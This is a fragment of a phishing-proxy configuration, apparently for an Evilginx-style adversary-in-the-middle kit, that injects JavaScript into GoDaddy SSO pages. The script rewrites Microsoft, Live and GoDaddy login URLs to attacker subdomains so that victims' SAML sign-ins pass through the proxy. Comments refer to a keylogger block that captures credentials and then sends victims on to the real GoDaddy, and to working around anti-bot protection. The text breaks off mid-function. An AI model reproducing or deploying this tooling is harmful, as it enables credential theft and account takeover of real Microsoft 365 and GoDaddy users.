js_inject:
  # Backstop on the GoDaddy SSO IDP host: after the password POST, the IDP
  # responds with either (a) a self-submitting SAML form whose action= points
  # to login.microsoftonline.com, or (b) a JS redirect via window.location.
  # If sub_filters miss either (compression, dynamic strings), this rewrites
  # them to our proxy at runtime so the user lands on /common/SAS/ProcessAuth
  # under woman.<phish_domain> instead of the real Microsoft.
  # Note: do NOT include sso.godaddy.com here — it has its own keylogger
  # block below (line ~570) that intentionally redirects victims to the real
  # GoDaddy after credentials are captured (Kasada anti-bot can't be
  # proxied). Hooking window.location here would defeat that recovery.
  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net"]
    trigger_paths: ["/*", "/"]
    script: |
      (function() {
        var _phishDomain = (function() {
          var parts = window.location.hostname.split('.');
          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
        })();
        var _msHost     = 'woman.' + _phishDomain;
        var _liveHost   = 'living.' + _phishDomain;
        var _gdHost     = 'ssso.'  + _phishDomain;
        var _ssnHost    = 'sssn.'  + _phishDomain;
        var _ssn2Host   = 'sssn2.' + _phishDomain;

        function _rewrite(url) {
          if (typeof url !== 'string') return url;
          return url
            .replace(/https?:\/\/login\.microsoftonline\.com/gi, 'https://' + _msHost)
            .replace(/https?:\/\/login\.live\.com/gi,           'https://' + _liveHost)
            .replace(/https?:\/\/sso\.godaddy\.com/gi,          'https://' + _gdHost)
            .replace(/https?:\/\/sso\.secureserver\.net/gi,     'https://' + _ssnHost)
            .replace(/https?:\/\/sso2\.secureserver\.net/gi,    'https://' + _ssn2Host);
        }

        // Patch any <form action="..."> pointing at MS or any federation IDP host
        function _patchForms() {
          var forms = document.getElementsByTagName('form');
          for (var i = 0; i < forms.length; i++) {
